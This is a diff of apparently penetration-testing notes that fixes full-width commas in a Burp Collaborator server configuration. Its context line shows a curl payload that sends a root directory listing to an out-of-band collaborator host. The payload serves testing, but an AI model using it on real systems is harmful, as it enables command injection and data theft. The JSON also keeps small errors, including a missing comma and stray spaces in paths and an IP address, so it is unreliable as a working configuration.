@@ -84,59 +84,59 @@ curl https://p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d "`ls -al /`"
 >
 >```json
 >{ 
->  "serverDomain":"burpcollaborator.example.com"，
->  "workerThreads":10，
+>  "serverDomain":"burpcollaborator.example.com",
+>  "workerThreads":10,
 >  "eventCapture":{ 
->    "localAddress":["10.20.0.159"，"127.0.0.1"]，
->    "publicAddress":"10.20.0.159 "，
+>    "localAddress":["10.20.0.159","127.0.0.1"],
+>    "publicAddress":"10.20.0.159 ",
 >    "http":{ 
 >      "ports":80 
->    }，
+>    },
 >    "https":{ 
 >      "ports":443 
->    }，
+>    },
 >    "smtp":{ 
 >      "ports":[     25,587 ] 
->    }，
+>    },
 >"smtps":{ 
 >      "ports" :465 
->    }，
+>    },
 >    "ssl":{ 
 >      "certificateFiles":[ 
->        "keys / burpcollaborator.example.com.key.pkcs8"，
->        "keys / burpcollaborator.example.com.crt"，
+>        "keys / burpcollaborator.example.com.key.pkcs8",
+>        "keys / burpcollaborator.example.com.crt",
 >        "keys / intermediate.crt"] 
 >    } 
->  }，
+>  },
 >  "polling":{ 
->    "localAddress":"127.0.0.1"，
->    "publicAddress":"10.20.0.159"，
+>    "localAddress":"127.0.0.1",
+>    "publicAddress":"10.20.0.159",
 >    "http ":{ 
 >      "port":9090 
->    }，
+>    },
 >    "https":{ 
 >      "port":9443 
->    }，
+>    },
 >    "ssl":{ 
 >      "hostname":"collaboratorpolling.example.com" 
 >    } 
->  }，
+>  },
 >  "metrics":{ 
 >    "path": "jnaicmez8"
 >    "addressWhitelist":["21.10.23.0/24"] 
->  }，
+>  },
 >  "dns":{
 >    "interfaces":[{ 
->      "name":"ns1"，
->      "localAddress":"34.23.11.6"，
+>      "name":"ns1",
+>      "localAddress":"34.23.11.6",
 >      "publicAddress":"98.87.76.55" 
->    }，{ 
->      "name":"ns2"，
->      "localAddress":"34.23 .11.6"，
+>    },{ 
+>      "name":"ns2",
+>      "localAddress":"34.23 .11.6",
 >      "publicAddress":"98.87.11.00" 
->    }]，
+>    }],
 >    "ports":53 
->  }，
+>  },
 >  "logLevel":"INFO" 
 >}
 >```
